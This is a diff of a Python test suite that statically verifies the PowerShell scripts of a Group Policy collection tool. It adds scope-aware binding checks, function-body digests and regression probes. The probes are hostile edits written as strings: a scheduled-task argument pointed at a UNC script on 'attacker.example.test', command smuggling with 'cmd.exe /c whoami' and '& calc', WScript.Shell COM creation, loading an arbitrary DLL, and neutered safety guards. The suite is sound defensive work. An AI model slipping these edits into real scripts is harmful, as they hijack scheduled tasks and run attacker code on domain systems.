-#   "index <target> = <rhs>"     an index write on the variable's object
-# Names are merged per script (casefolded, scope prefix stripped), which over-
-# approximates PowerShell's dynamic scoping: a binding anywhere counts.
+#   "index <target>"             an index write on the variable's object
+# Every key is prefixed with the scope that makes the binding, `[<function>]`
+# or `[script]` (a ForEach-Object/Where-Object/.ForEach() scriptblock runs in
+# its caller's scope, so it is attributed to the enclosing function; a call-site
+# argument belongs to the callee's scope). A pinned binding copied into another
+# function is therefore a new key. Variable names are casefolded with scope
+# prefixes (`$script:`) stripped.
 # ---------------------------------------------------------------------------
 
 _ASSIGN_OPERATORS = {
@@ -2735,10 +3298,14 @@ def _callable_functions(script: str, inv: dict[str, dict[str, Any]]) -> dict[str
     return found
 
 
+def _scope(function: str | None) -> str:
+    return f"[{_cf(function)}]" if function else "[script]"
+
+
 def _call_site_bindings(
     script: str, inv: dict[str, dict[str, Any]]
 ) -> tuple[list[tuple[str, str]], list[str]]:
-    """([(param, binding key)], [unresolvable call-site arguments])."""
+    """([(param, scoped binding key)], [unresolvable call-site arguments])."""
     functions = _callable_functions(script, inv)
     bindings: list[tuple[str, str]] = []
     unresolved: list[str] = []
@@ -2747,6 +3314,7 @@ def _call_site_bindings(
         if fn is None:
             continue
         params: list[str] = list(fn["params"])
+        scope = _scope(fn["name"])
         explicit: set[str] = set()
         positional: list[str] = []
         splats: list[str] = []
@@ -2765,18 +3333,23 @@ def _call_site_bindings(
                 unresolved.append(f"line {command['line']}: {command['name']} -{arg['parameter']}")
                 continue
             explicit.add(param)
-            bindings.append((param, f"arg {_norm(value)}" if value is not None else "arg switch"))
+            bindings.append(
+                (
+                    param,
+                    f"{scope} arg {_norm(value)}" if value is not None else f"{scope} arg switch",
+                )
+            )
         free = [p for p in params if p not in explicit]
         for i, value in enumerate(positional):
             if i < len(free):
-                bindings.append((free[i], f"arg {value}"))
+                bindings.append((free[i], f"{scope} arg {value}"))
             else:
-                bindings.append(("args", f"arg {value}"))
+                bindings.append(("args", f"{scope} arg {value}"))
         for splat in splats:
             for param in free:
-                bindings.append((param, f"splat {splat}"))
+                bindings.append((param, f"{scope} splat {splat}"))
         for param in fn["pipeline_params"]:
-            bindings.append((param, "pipeline"))
+            bindings.append((param, f"{scope} pipeline"))
     return bindings, unresolved
 
 
@@ -2790,18 +3363,21 @@ def _all_bindings(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, set[
     for binding in entry["variable_assignments"]:
         if _bare_var(binding["name"]) == "null":
             continue  # `$null = ...` discards output; it cannot rebind anything
-        add(binding["name"], _binding_key(binding))
+        add(binding["name"], f"{_scope(binding['function'])} {_binding_key(binding)}")
     params, _ = _call_site_bindings(script, inv)
     for param, key in params:
         add(param, key)
     for write in _common_param_writes(entry):
-        add(write["target"], f"common -{write['parameter']}")
+        add(write["target"], f"{_scope(write['function'])} common -{write['parameter']}")
     for member in entry["member_assignments"]:
         if member["receiver_var"]:
-            add(member["receiver_var"], f"member {_norm(member['target'])}")
+            add(
+                member["receiver_var"],
+                f"{_scope(member['function'])} member {_norm(member['target'])}",
+            )
     for index in entry["index_assignments"]:
         if index["root_var"]:
-            add(index["root_var"], f"index {_norm(index['target'])}")
+            add(index["root_var"], f"{_scope(index['function'])} index {_norm(index['target'])}")
     return out
 
 
@@ -2864,14 +3440,14 @@ def _required_vars(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, str
         if not command["name"]:
             for var in sorted(_vars_in(command["text"])):
                 need(var, f"dynamic invocation {_norm(command['text'])}")
-        elif command["name"] in TASK_ARG_VECTORS:
+        elif command["name"] in _TASK_VECTORS_CF:
             for arg in command["arguments"]:
                 for var in sorted(_vars_in(arg["value"])):
                     need(var, f"{command['name']} argument")
     for source in POLICIES[script].dot_sources:
         for fn in inv[source]["function_params"]:
             for param in fn["params"]:
-                if _cf(param) in PINNED_VARS[source]:
+                if param in PINNED_VARS[source]:
                     need(param, f"parameter of {fn['name']} (pinned in {source})")
     bindings = _all_bindings(script, inv)
     pending = list(reasons)
@@ -2907,7 +3483,7 @@ def _run_dumper_raw(exe: str, paths: list[str], *flags: str, timeout: int = 120)
 
 
 def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
-    return {Path(entry["path"]).name: entry for entry in _run_dumper_raw(exe, paths)}
+    return {Path(e["path"]).name: _canonicalize(e) for e in _run_dumper_raw(exe, paths)}
 
 
 @cache
@@ -2937,7 +3513,7 @@ def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> N
 def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
     policy = POLICIES[script]
     named = {c["name"] for c in entry["commands"] if c["name"]}
-    _exact("commands", script, named - local, policy.commands)
+    _exact("commands", script, named - _cfset(local), _cfset(policy.commands))
     dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
     _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
     # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
@@ -2945,13 +3521,13 @@ def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
     assert not entry["indirect_writes"], (
         f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
     )
-    forbidden = sorted({_cf(n) for n in named} & {_cf(n) for n in FORBIDDEN_COMMANDS})
+    forbidden = sorted(named & _cfset(FORBIDDEN_COMMANDS))
     assert not forbidden, f"{script}: commands that are never allowed: {forbidden}"
     # ForEach-Object may only run scriptblocks: `ForEach-Object Delete` /
     # `-MemberName Delete` invokes a method by name, invisible to the member
     # allowlist.
     for command in entry["commands"]:
-        if _cf(command["name"] or "") not in ("foreach-object", "%", "foreach"):
+        if command["name"] not in ("foreach-object", "%", "foreach"):
             continue
         for arg in command["arguments"]:
             param = arg["parameter"]
@@ -2973,10 +3549,11 @@ def check_dotnet(script: str, entry: dict[str, Any]) -> None:
     members = entry["members"]
     dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
     assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
-    static = {f"{_normalize_type(m['type'])}::{m['member']}" for m in members if m["static"]}
-    _exact("static .NET methods", script, static, policy.static_methods)
+    static = {_method_key(m["type"], m["member"]) for m in members if m["static"]}
+    allowed_static = frozenset(_method_key(*k.split("::")) for k in policy.static_methods)
+    _exact("static .NET methods", script, static, allowed_static)
     instance = {m["member"] for m in members if not m["static"]}
-    _exact("instance .NET methods", script, instance, policy.instance_methods)
+    _exact("instance .NET methods", script, instance, _cfset(policy.instance_methods))
     assigned = {a["target"] for a in entry["member_assignments"]}
     _exact("property assignments", script, assigned, policy.member_assignments)
 
@@ -2990,7 +3567,8 @@ def check_types(script: str, entry: dict[str, Any]) -> None:
 
 
 def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
-    allowed = INSTANCE_RECEIVERS.get(script, {})
+    allowed = {_cf(k): v for k, v in INSTANCE_RECEIVERS.get(script, {}).items()}
+    side_effecting = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
     for member in entry["members"]:
         if member["static"]:
             continue
@@ -3002,13 +3580,13 @@ def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
             # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
             # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
             # screened any type-literal receiver).
-            assert name not in _SIDE_EFFECTING_METHODS, (
+            assert name not in side_effecting, (
                 f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
                 f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
             )
             continue
         permitted = allowed.get(name, frozenset())
-        assert _cf(receiver_var) in permitted, (
+        assert receiver_var in permitted, (
             f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
             f"${receiver_var} (allowed: {sorted(permitted)})"
         )
@@ -3044,6 +3622,7 @@ def _common_param_writes(entry: dict[str, Any]) -> list[dict[str, Any]]:
                 writes.append(
                     {
                         "line": command["line"],
+                        "function": command["function"],
                         "parameter": str(arg["parameter"]),
                         "target": raw.lstrip("+") if literal else raw,
                         "literal": literal,
@@ -3076,17 +3655,21 @@ def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
     definitions: set[str] = set()
     for command in entry["commands"]:
         bound = command["bound"]
-        if command["name"] == "New-Object":
-            assert "ComObject" not in bound, f"{script}:{command['line']}: COM is not allowed"
-            types.add(str(bound.get("TypeName")))
-        elif command["name"] == "Add-Type":
-            keys = set(bound) - {"ErrorAction"}
-            if keys == {"AssemblyName"}:
-                assemblies.add(bound["AssemblyName"])
-            elif keys == {"TypeDefinition"} and command["type_definition_sha256"]:
+        if command["name"] == "new-object":
+            assert "comobject" not in bound, f"{script}:{command['line']}: COM is not allowed"
+            types.add(str(bound.get("typename")))
+        elif command["name"] == "add-type":
+            keys = set(bound) - {"erroraction"}
+            if keys == {"assemblyname"}:
+                assemblies.add(bound["assemblyname"])
+            elif keys == {"typedefinition"} and command["type_definition_sha256"]:
                 definitions.add(command["type_definition_sha256"])
             else:
-                pytest.fail(f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}")
+                # AssertionError (not pytest.fail) so _run_checks and the
+                # generator report it as a check failure (Sol round-4 NB-3).
+                raise AssertionError(
+                    f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}"
+                )
     _exact("New-Object types", script, types, policy.new_object_types)
     _exact("Add-Type assemblies", script, assemblies, policy.add_type_assemblies)
     _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)
@@ -3096,8 +3679,8 @@ def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
     targets: list[tuple[int, str]] = []
     for command in entry["commands"]:
         name = command["name"] or ""
-        required = _WRITE_COMMANDS.get(name)
-        optional = _OPTIONAL_PATH_COMMANDS.get(name)
+        required = _WRITE_COMMANDS_CF.get(name)
+        optional = _OPTIONAL_PATH_COMMANDS_CF.get(name)
         params = required or optional
         if params is None:
             continue
@@ -3110,9 +3693,7 @@ def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
             )
         targets.extend((command["line"], text) for text in bound)
     for member in entry["members"]:
-        if member["static"] and f"{_normalize_type(member['type'])}::{member['member']}" in (
-            _WRITE_STATIC
-        ):
+        if member["static"] and _method_key(member["type"], member["member"]) in _WRITE_STATIC_CF:
             targets.append((member["line"], member["first_argument"] or ""))
     return targets
 
@@ -3139,20 +3720,20 @@ def check_writes(script: str, entry: dict[str, Any]) -> None:
     # New-Item must not create links, target a provider, or carry a -Name
     # component (another path segment, Sol BL-4), -Value or -Target path.
     for command in entry["commands"]:
-        if command["name"] != "New-Item":
+        if command["name"] != "new-item":
             continue
         bound = command["bound"]
-        item_type = _cf(str(bound.get("ItemType", "")))
+        item_type = _cf(str(bound.get("itemtype", "")))
         assert item_type not in _FORBIDDEN_ITEM_TYPES, (
-            f"{script}:{command['line']}: New-Item -ItemType {bound.get('ItemType')} is not allowed"
+            f"{script}:{command['line']}: New-Item -ItemType {bound.get('itemtype')} is not allowed"
         )
-        assert "PSProvider" not in bound, (
+        assert "psprovider" not in bound, (
             f"{script}:{command['line']}: New-Item -PSProvider blocked"
         )
-        assert "Name" not in bound, (
+        assert "name" not in bound, (
             f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
         )
-        for key in ("Value", "Target"):
+        for key in ("value", "target"):
             value = bound.get(key)
             if isinstance(value, str):
                 assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
@@ -3284,15 +3865,46 @@ def check_ast(script: str, entry: dict[str, Any]) -> None:
     assert entry["source_non_ascii_bytes"] == 0, (
         f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
     )
+    # LF only (.gitattributes pins it): the golden digests exact bytes, and a CR
+    # inside a multi-line literal would change that literal's value (Sol r4 NB-2).
+    assert entry["source_cr_bytes"] == 0, (
+        f"{script}: source has {entry['source_cr_bytes']} CR bytes (LF line endings only)"
+    )
 
 
 def check_local_functions(script: str, entry: dict[str, Any]) -> None:
     names = list(entry["functions"])
-    assert len(names) == len({_cf(n) for n in names}), f"{script}: a function is defined twice"
-    assert tuple(names) == LOCAL_FUNCTIONS[script], (
-        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS "
-        f"{list(LOCAL_FUNCTIONS[script])}"
+    assert len(names) == len(set(names)), f"{script}: a function is defined twice"
+    expected = [_cf(n) for n in LOCAL_FUNCTIONS[script]]
+    assert names == expected, (
+        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS {expected}"
     )
+
+
+def _function_body_digest(fn: dict[str, Any]) -> str:
+    text = "\n".join(_ast_line(row) for row in fn["body_rows"])
+    return hashlib.sha256(text.encode("utf-8")).hexdigest()
+
+
+def check_local_function_bodies(script: str, entry: dict[str, Any]) -> None:
+    """Every local function's whole normalized syntax tree is pinned by digest
+    in LOCAL_FUNCTION_BODIES (hand-maintained; the generator never writes it).
+
+    The dataflow pins see a helper's call expression, not what it returns or
+    does: Sol round 4 changed Get-GpoLensCompletedExports to emit an outside-
+    root FileInfo (into a pinned Remove-Item via the catch path) and
+    ConvertTo-GpoLensTaskArgument to return a constant UNC `-File` target, with
+    every pin unchanged. Any edit to a function body now needs a reviewed
+    digest update here.
+    """
+    actual = {fn["name"]: _function_body_digest(fn) for fn in entry["function_params"]}
+    allowed = {_cf(k): v for k, v in LOCAL_FUNCTION_BODIES[script].items()}
+    changed = sorted(n for n in actual if n in allowed and actual[n] != allowed[n])
+    assert not changed, (
+        f"{script}: function bodies changed (review, then update LOCAL_FUNCTION_BODIES): "
+        + ", ".join(f"{n} -> {actual[n]}" for n in changed)
+    )
+    _exact("pinned function bodies", script, set(actual), frozenset(allowed))
 
 
 # Operations that write, delete, execute or register: their exact normalized
@@ -3302,38 +3914,68 @@ def check_local_functions(script: str, entry: dict[str, Any]) -> None:
 # multiset. A duplicate outside its guard (Sol round-3 `Unregister-Scheduled-
 # Task` copy), a guard moved after the operation (Sol/DeepSeek reorders), or a
 # weakened guard condition (Sol `-or` -> `-and`) changes the multiset.
-_GUARDED_COMMANDS = frozenset(
+_GUARDED_COMMANDS = _cfset(
     set(_WRITE_COMMANDS) | {"Register-ScheduledTask", "Unregister-ScheduledTask", "Get-GPOReport"}
 )
 _GUARDED_STATIC = frozenset(
-    _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
+    _method_key(*k.split("::"))
+    for k in _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
 )
+_GUARDED_INSTANCE = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
 
 
-def _guarded_ops(entry: dict[str, Any]) -> list[tuple[str, tuple[str, ...]]]:
-    ops: list[tuple[str, tuple[str, ...]]] = []
+def _base_guarded_ops(entry: dict[str, Any]) -> list[tuple[str, str, tuple[str, ...]]]:
+    """(enclosing function, op text, context) for every write/exec/lifetime op."""
+    ops: list[tuple[str, str, tuple[str, ...]]] = []
     for command in entry["commands"]:
         name = command["name"]
         dynamic = not name or command["invocation"] in ("Ampersand", "Dot")
         if dynamic or name in _GUARDED_COMMANDS:
-            ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
+            ctx = tuple(_norm(c) for c in command["context"])
+            ops.append((command["function"], _norm(command["text"]), ctx))
     for member in entry["members"]:
         if member["static"]:
-            if (
-                f"{_normalize_type(member['type'] or '')}::{member['member']}"
-                not in _GUARDED_STATIC
-            ):
+            if _method_key(member["type"], member["member"]) not in _GUARDED_STATIC:
                 continue
-        elif member["member"] not in _SIDE_EFFECTING_METHODS:
+        elif member["member"] not in _GUARDED_INSTANCE:
             continue
-        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
+        ctx = tuple(_norm(c) for c in member["context"])
+        ops.append((member["function"], _norm(member["text"]), ctx))
     return ops
 
 
-def check_guarded_ops(script: str, entry: dict[str, Any]) -> None:
+def _writer_functions(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
+    """Local functions (in-file or dot-sourced) that perform a guarded op,
+    directly or through another writer function."""
+    sources = (script, *POLICIES[script].dot_sources)
+    writers = {fn for src in sources for fn, _op, _ctx in _base_guarded_ops(inv[src]) if fn}
+    changed = True
+    while changed:
+        changed = False
+        for src in sources:
+            for command in inv[src]["commands"]:
+                fn = command["function"]
+                if fn and fn not in writers and command["name"] in writers:
+                    writers.add(fn)
+                    changed = True
+    return writers
+
+
+def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
+    """Guarded ops of *script*, plus every call to a writer function, so a
+    caller's guard around a write helper is pinned too (Sol round-4 NB-1)."""
+    ops = [(op, ctx) for _fn, op, ctx in _base_guarded_ops(inv[script])]
+    writers = _writer_functions(script, inv)
+    for command in inv[script]["commands"]:
+        if command["name"] in writers:
+            ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
+    return ops
+
+
+def check_guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> None:
     from collections import Counter
 
-    actual = Counter(_guarded_ops(entry))
+    actual = Counter(_guarded_ops(script, inv))
     allowed = Counter(GUARDED_OPS[script])
     extra = actual - allowed
     missing = allowed - actual
@@ -3346,7 +3988,7 @@ def check_guarded_ops(script: str, entry: dict[str, Any]) -> None:
 
 def _arg_vector(command: dict[str, Any]) -> TaskVector:
     return frozenset(
-        (str(a["parameter"]), _norm(a["value"]) if a["value"] is not None else None)
+        (_cf(str(a["parameter"])), _norm(a["value"]) if a["value"] is not None else None)
         for a in command["arguments"]
         if a["parameter"]
     )
@@ -3355,12 +3997,12 @@ def _arg_vector(command: dict[str, Any]) -> TaskVector:
 def check_task_action(script: str, entry: dict[str, Any]) -> None:
     if script != _TASK_ACTION_SCRIPT:
         for command in entry["commands"]:
-            assert command["name"] not in TASK_ARG_VECTORS, (
+            assert command["name"] not in _TASK_VECTORS_CF, (
                 f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
             )
         return
     for command in entry["commands"]:
-        vectors = TASK_ARG_VECTORS.get(command["name"] or "")
+        vectors = _TASK_VECTORS_CF.get(command["name"] or "")
         if vectors is None:
             continue
         # The full argument vector must match one pinned vector exactly. An
@@ -3381,6 +4023,7 @@ def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, 
         "ast": check_ast,
         "commands": lambda s, e: check_commands(s, e, local),
         "local_functions": check_local_functions,
+        "local_function_bodies": check_local_function_bodies,
         "dotnet": check_dotnet,
         "types": check_types,
         "instance_receivers": check_instance_receivers,
@@ -3391,7 +4034,7 @@ def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, 
         "bindings": check_bindings,
         "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
         "task_action": check_task_action,
-        "guarded_ops": check_guarded_ops,
+        "guarded_ops": lambda s, e: check_guarded_ops(s, inv),
     }
 
 
@@ -3554,6 +4197,7 @@ def test_policy_tables_cover_every_script() -> None:
         ("INDEX_ASSIGNMENT_ROOTS", INDEX_ASSIGNMENT_ROOTS),
         ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
         ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
+        ("LOCAL_FUNCTION_BODIES", LOCAL_FUNCTION_BODIES),
         ("GUARDED_OPS", GUARDED_OPS),
     ):
         assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"
@@ -3638,7 +4282,7 @@ def test_no_unpinnable_or_engine_bindings(
 def test_write_and_exec_operations_keep_their_guards(
     inventory: dict[str, dict[str, Any]], script: str
 ) -> None:
-    check_guarded_ops(script, inventory[script])
+    check_guarded_ops(script, inventory)
 
 
 def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
@@ -4270,6 +4914,231 @@ _REGRESSIONS: list[Probe] = [
         "append",
         "[guid]::TryParse('x', [ref]$OutputRoot) | Out-Null\n",
     ),
+    # --- Round-4 candidates (Sol; DeepSeek helper class), each previously accepted ---
+    # Sol BL-1: a helper's emitted value changed to an outside-root FileInfo,
+    # which the pinned catch-path Remove-Item then deletes.
+    (
+        "r4s_helper_returns_outside_file",
+        "Run-GpoLensCollection.ps1",
+        "replace",
+        (
+            "if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
+            "if ($zip.GetEntry('AllGPOs.xml')) { Get-Item -LiteralPath "
+            "'C:\\Windows\\System32\\drivers\\etc\\hosts' }",
+        ),
+    ),
+    # Sol BL-2: the task-argument helper returns a constant UNC -File target.
+    (
+        "r4s_task_quote_helper_remote_script",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'",
+            "return '\"\\\\attacker.example.test\\share\\Mutate-Domain.ps1\"'",
+        ),
+    ),
+    # DeepSeek round 4: the same helper class.
+    (
+        "r4d_helper_taskarg_append",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
+            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\" & calc'\n",
+        ),
+    ),
+    (
+        "r4d_helper_abspath_change",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "    return [IO.Path]::GetFullPath($Value)\n",
+            "    return 'C:\\Windows\\Temp\\hijacked'\n",
+        ),
+    ),
+    # Sol BL-3: the collection lock released before the protected block.
+    (
+        "r4s_early_lock_dispose",
+        "Run-GpoLensCollection.ps1",
+        "before",
+        (
+            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
+            "    $lock.Dispose()\n",
+        ),
+    ),
+    # Sol NB-1: a write helper called outside its caller's guard.
+    (
+        "r4s_caller_guard_duplicate_marker_write",
+        "Register-GpoLensCollection.ps1",
+        "before",
+        (
+            "if ($MyInvocation.InvocationName -ne '.')",
+            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot "
+            "-Bytes ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))\n",
+        ),
+    ),
+    # Sol NB-3: a rejected Add-Type form must be a check failure, not a crash.
+    (
+        "r4s_add_type_path",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Add-Type -Path 'C:\\reviewer-evil.dll'\n",
+    ),
+    # Sol NB-2: CR bytes inside the existing here-string (old golden: SAME).
+    (
+        "r4s_here_string_crlf",
+        "GpoLensCollectionMarker.ps1",
+        "replace",
+        ("namespace GpoLens {\n", "namespace GpoLens {\r\n"),
+    ),
+    # Cross-repo class 2: a ForEach-Object / Where-Object / .ForEach()
+    # scriptblock runs in the caller's scope, so an unqualified assignment in it
+    # rebinds the caller's pinned variable.
+    (
+        "r4x_foreach_object_scope_rebind",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "Get-ChildItem -LiteralPath $OutputRoot | ForEach-Object { $OutputRoot = 'C:\\Windows' }\n",
+    ),
+    (
+        "r4x_where_object_scope_rebind",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Get-ChildItem -LiteralPath $OutputRoot | "
+        "Where-Object { ($dest = 'C:\\Windows\\System32') }\n",
+    ),
+    (
+        "r4x_intrinsic_foreach_scope_rebind",
+        "Export-GpoEstate.ps1",
+        "append",
+        "@(1).ForEach({ $OutputRoot = 'C:\\Windows' })\n",
+    ),
+    # Per-scope pinning: an existing pinned binding copied into another function.
+    (
+        "r4x_scope_moved_binding",
+        "GpoLensCollectionMarker.ps1",
+        "replace",
+        (
+            "    param([string]$Marker)\n",
+            "    param([string]$Marker)\n"
+            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n",
+        ),
+    ),
+    # Cross-repo class 1: re-cased command / method / parameter names.
+    (
+        "r4x_case_new_object_com",
+        "Export-GpoEstate.ps1",
+        "append",
+        "nEw-ObJeCt -comobject 'WScript.Shell'\n",
+    ),
+    (
+        "r4x_case_remove_item_duplicate",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "remove-item -literalpath $folder -recurse -force\n",
+    ),
+    (
+        "r4x_case_lifetime_dispose",
+        "Run-GpoLensCollection.ps1",
+        "before",
+        (
+            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
+            "    $LOCK.dispose()\n",
+        ),
+    ),
+    # --- DeepSeek round 4 NEW-BLOCKING-1 (helper and guard bodies) ---
+    (
+        "r4d_helper_taskarg_hijack",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
+            "    return '\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c whoami'\n",
+        ),
+    ),
+    (
+        "r4d_helper_early_return_getcompleted",
+        "Run-GpoLensCollection.ps1",
+        "before",
+        (
+            "    $candidates = @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
+            "-ErrorAction Stop |",
+            "    return (Get-Item -LiteralPath 'C:\\Windows\\Temp\\evil.zip')\n",
+        ),
+    ),
+    (
+        "r4d_guardbody_assert_regular_tree",
+        "Run-GpoLensCollection.ps1",
+        "replace",
+        (
+            "        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
+            "            throw 'Retention refuses a linked export folder or file.'\n"
+            "        }\n"
+            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n"
+            "            if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
+            "                throw 'Retention refuses a linked export folder or file.'\n"
+            "            }\n",
+            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n",
+        ),
+    ),
+    (
+        "r4d_helper_owner_guard_neutered",
+        "Run-GpoLensCollection.ps1",
+        "replace",
+        (
+            "    if (-not [string]::Equals($owner, $TaskName, "
+            "[StringComparison]::OrdinalIgnoreCase)) {\n"
+            '        throw "Collection refuses output root owner',
+            '    if ($false) {\n        throw "Collection refuses output root owner',
+        ),
+    ),
+    (
+        "r4d_helper_entry_change",
+        "Run-GpoLensCollection.ps1",
+        "replace",
+        (
+            "            if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
+            "            if ($zip.GetEntry('evil.xml')) { $archive }",
+        ),
+    ),
+    (
+        "r4d_helper_marker_linkcount_neutered",
+        "GpoLensCollectionMarker.ps1",
+        "replace",
+        (
+            "        if ($links -ne 1) { throw 'Collection refuses a linked owner marker.' }\n",
+            "        if ($links -ne 1) { Write-Warning 'link count ignored' }\n",
+        ),
+    ),
+    (
+        "r4d_helper_filter_change",
+        "Run-GpoLensCollection.ps1",
+        "replace",
+        (
+            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop |",
+            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.*' -ErrorAction Stop |",
+        ),
+    ),
+    (
+        "r4d_guardbody_owner_guard_return",
+        "GpoLensCollectionMarker.ps1",
+        "replace",
+        (
+            "        throw 'Registration refuses a linked output root.'\n",
+            "        Write-Warning 'skip linked output root'\n",
+        ),
+    ),
+    # DeepSeek NON-BLOCKING-1: a static call on a computed type must be a clean
+    # check failure (it crashed _write_targets at 64411db).
+    (
+        "r4d_static_computed_type",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$t = [IO.File]\n$t::Delete('C:\\Windows\\Temp\\x')\n",
+    ),
+    # DeepSeek NON-BLOCKING-3: a UTF-8 BOM (old golden: SAME; digest was of
+    # BOM-stripped text).
+    ("r4d_bom", "Export-GpoEstate.ps1", "prepend", "\ufeff"),
 ]
 
 # NON-BL-3: the regression suite asserts WHICH substantive check flagged each
@@ -4356,6 +5225,31 @@ _PROBE_EXPECTED_CHECK: dict[str, str] = {
     "r4_guard_function_redefined": "local_functions",
     "r4_safe_name_rebind": "pinned_bindings",
     "r4_ref_rebind_root": "pinned_bindings",
+    "r4s_helper_returns_outside_file": "local_function_bodies",
+    "r4s_task_quote_helper_remote_script": "local_function_bodies",
+    "r4d_helper_taskarg_append": "local_function_bodies",
+    "r4d_helper_abspath_change": "local_function_bodies",
+    "r4s_early_lock_dispose": "guarded_ops",
+    "r4s_caller_guard_duplicate_marker_write": "guarded_ops",
+    "r4s_add_type_path": "new_object_and_add_type",
+    "r4s_here_string_crlf": "ast",
+    "r4x_foreach_object_scope_rebind": "pinned_bindings",
+    "r4x_where_object_scope_rebind": "pinned_bindings",
+    "r4x_intrinsic_foreach_scope_rebind": "pinned_bindings",
+    "r4x_scope_moved_binding": "pinned_bindings",
+    "r4x_case_new_object_com": "new_object_and_add_type",
+    "r4x_case_remove_item_duplicate": "guarded_ops",
+    "r4x_case_lifetime_dispose": "guarded_ops",
+    "r4d_helper_taskarg_hijack": "local_function_bodies",
+    "r4d_helper_early_return_getcompleted": "local_function_bodies",
+    "r4d_guardbody_assert_regular_tree": "local_function_bodies",
+    "r4d_helper_owner_guard_neutered": "local_function_bodies",
+    "r4d_helper_entry_change": "local_function_bodies",
+    "r4d_helper_marker_linkcount_neutered": "local_function_bodies",
+    "r4d_helper_filter_change": "local_function_bodies",
+    "r4d_guardbody_owner_guard_return": "local_function_bodies",
+    "r4d_static_computed_type": "dotnet",
+    "r4d_bom": "ast",
 }
 
 
@@ -4422,7 +5316,7 @@ def test_reviewer_probes_are_flagged(tmp_path: Path, probe: Probe) -> None:
     )
     # Both layers: the edit also changes the committed syntax-tree inventory.
     committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
-    assert _canonical(inv[base])["ast"] != committed[base]["ast"], (
+    assert _canonical(inv[base]) != committed[base], (
         f"{probe_id}: the golden syntax-tree inventory did not change"
     )
 
@@ -4682,8 +5576,9 @@ def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> 
     statements, negate conditions, insert an index assignment / `return`, add
     `#Requires` — and require the serialized syntax tree to differ for every
     mutant that still parses. Comment/whitespace-only edits must leave the tree
